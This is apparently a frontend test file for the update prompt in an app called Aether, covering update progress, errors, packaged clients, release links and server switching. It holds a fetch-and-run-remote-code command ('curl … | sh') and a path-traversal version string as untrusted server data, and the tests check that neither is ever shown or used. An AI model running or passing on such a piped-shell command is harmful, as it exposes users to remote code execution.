import { act, fireEvent, render, screen, within } from '@testing-library/react'
import { UpdateGate } from '@/components/update-gate'
import { ApiError, upgradeRequired } from '@/lib/api'
import type { UpdateApplyResult } from '@/lib/types'
import { useStore } from '@/store'
import { fakeApi, updateStatus } from '@/test/fixtures'
import { caps, seed } from '@/test/update-banner-harness'

vi.mock('sonner', () => ({ toast: { success: vi.fn(), error: vi.fn(), info: vi.fn() } }))

const required = upgradeRequired(
  new ApiError(
    426,
    'workspace.list: this aether is v1.2.3 and the server runs v1.3.0; update this client first: run `aether update`, then retry',
    -32005,
    { client_version: 'v1.2.3', server_version: 'v1.3.0', min_client_version: 'v1.3.0', command: 'curl https://example.invalid/x | sh' },
  ),
)

beforeEach(() => {
  vi.clearAllMocks()
  seed({ capabilities: caps({ local: ['link.status', 'update.check', 'update.apply', 'link.switch'] }) })
  useStore.setState({
    updateRequired: required,
    update: updateStatus({ client_update_required: true, target_version: 'v1.3.0' }),
    clientApply: { name: 'idle' },
  })
})

test('says the server words once, the minimum and the manual command, and takes focus', () => {
  render(<UpdateGate client={fakeApi()} />)
  const heading = screen.getByRole('heading', { name: 'Update Aether to keep using this server' })
  expect(document.activeElement).toBe(heading)
  const region = screen.getByRole('region', { name: 'Update Aether to keep using this server' })
  expect(screen.queryByRole('alert')).toBeNull()
  expect(
    within(region).getAllByText(/this aether is v1\.2\.3 and the server runs v1\.3\.0/, { ignore: 'pre' }),
  ).toHaveLength(1)
  expect(within(region).getByText(/It accepts clients from v1\.3\.0\./)).toBeTruthy()
  expect(screen.getByText('aether update')).toBeTruthy()
  // The server's own command is never offered for pasting.
  expect(screen.queryByText(/curl/)).toBeNull()
  expect(screen.getByText(/and reload this page\./).textContent).toBe('Then restart aether gui and reload this page.')
  expect(screen.getByRole('button', { name: 'Copy details' })).toBeTruthy()
  expect(screen.getByRole('button', { name: 'Reload' })).toBeTruthy()
  // Never dismissible.
  expect(screen.queryByRole('button', { name: /dismiss|close/i })).toBeNull()
})

test('Update now applies, shows progress, then says what is left to do', async () => {
  let finish: (value: UpdateApplyResult) => void = () => {}
  const client = fakeApi({
    localUpdateApply: vi.fn(() => new Promise<UpdateApplyResult>((resolve) => (finish = resolve))),
  })
  render(<UpdateGate client={client} />)
  fireEvent.click(screen.getByRole('button', { name: 'Update now' }))
  expect(await screen.findByText('Downloading and verifying v1.3.0…')).toBeTruthy()
  expect(screen.getByRole('button', { name: 'Updating…' }).hasAttribute('disabled')).toBe(true)
  await act(async () => finish({ updated: ['/home/user/.local/bin/aether'], version: 'v1.3.0', restarting: false, rebuilding: false }))
  expect(await screen.findByText('Aether v1.3.0 is installed.')).toBeTruthy()
})

test('a failed update shows the real error and keeps the button', async () => {
  const client = fakeApi({
    localUpdateApply: vi.fn(async () => {
      throw new ApiError(500, 'update.apply: aether-linux-amd64: sha256 mismatch')
    }),
  })
  render(<UpdateGate client={client} />)
  fireEvent.click(screen.getByRole('button', { name: 'Update now' }))
  expect(await screen.findByText('update.apply: aether-linux-amd64: sha256 mismatch')).toBeTruthy()
  expect(screen.getByRole('button', { name: 'Update now' }).hasAttribute('disabled')).toBe(false)
})

test('a packaged client is told which app updates it, with no button or command', () => {
  useStore.setState({
    update: updateStatus({
      client_update_required: true,
      target_version: 'v1.3.0',
      can_self_update: false,
      cli: { ...updateStatus().cli, packaged: 'Android app', can_self_update: false },
    }),
  })
  render(<UpdateGate client={fakeApi()} />)
  expect(screen.getByText('Updates come from the Android app: install its v1.3.0 release to update Aether.')).toBeTruthy()
  expect(screen.queryByRole('button', { name: 'Update now' })).toBeNull()
  expect(screen.queryByText('aether update')).toBeNull()
})

test('a cancelled administrator prompt says so with its detail, and the button comes back', async () => {
  const client = fakeApi({
    localUpdateApply: vi.fn(async () => {
      throw new ApiError(403, 'update.apply: administrator access was not granted: User canceled. (-128)')
    }),
  })
  render(<UpdateGate client={client} />)
  fireEvent.click(screen.getByRole('button', { name: 'Update now' }))
  const status = await screen.findByRole('status')
  expect(await within(status).findByText('Update cancelled, nothing was changed.')).toBeTruthy()
  expect(within(status).getByText('update.apply: administrator access was not granted: User canceled. (-128)')).toBeTruthy()
  expect(screen.getByRole('button', { name: 'Update now' }).hasAttribute('disabled')).toBe(false)
})

test('a binary this account cannot write gets sudo and no button', () => {
  useStore.setState({ update: updateStatus({ client_update_required: true, install_method: 'manual' }) })
  render(<UpdateGate client={fakeApi()} />)
  expect(screen.queryByRole('button', { name: 'Update now' })).toBeNull()
  expect(screen.getByText('sudo aether update')).toBeTruthy()
})

test('names the release and its page, never aether update, where the CLI cannot update itself', () => {
  useStore.setState({
    update: updateStatus({
      client_update_required: true,
      target_version: 'v1.3.0',
      can_self_update: false,
      cli: { ...updateStatus().cli, can_self_update: false },
    }),
  })
  render(<UpdateGate client={fakeApi()} />)
  expect(screen.getByText(/This aether cannot update itself\. Install v1\.3\.0 from its release page\./, { ignore: 'pre' })).toBeTruthy()
  expect(screen.getByRole('link', { name: 'Release v1.3.0' }).getAttribute('href')).toBe(
    'https://github.com/3xDevOps/Aether/releases/tag/v1.3.0',
  )
  expect(screen.queryByRole('button', { name: 'Update now' })).toBeNull()
  expect(screen.queryByText('aether update')).toBeNull()
})

test('a target that is not a release tag gets no link', () => {
  useStore.setState({
    update: updateStatus({ client_update_required: true, target_version: 'v1.3.0/../../evil', can_self_update: false }),
  })
  render(<UpdateGate client={fakeApi()} />)
  expect(screen.getByText(/This aether cannot update itself\./, { ignore: 'pre' })).toBeTruthy()
  expect(screen.queryByRole('link')).toBeNull()
})

test('another saved server is a way out', async () => {
  const client = fakeApi({ localLinkSwitch: vi.fn(async () => ({ active: 'lab' })) })
  useStore.setState({
    linkStatus: {
      server_configured: true,
      linked: false,
      active: '',
      default: { name: '', addr: 'old.example.invalid:2222' },
      links: [{ name: 'lab', addr: 'lab.example.invalid:2222' }],
    } as never,
  })
  render(<UpdateGate client={client} />)
  fireEvent.click(screen.getByRole('button', { name: 'Switch to lab (lab.example.invalid:2222)' }))
  expect(client.localLinkSwitch).toHaveBeenCalledWith('lab')
})
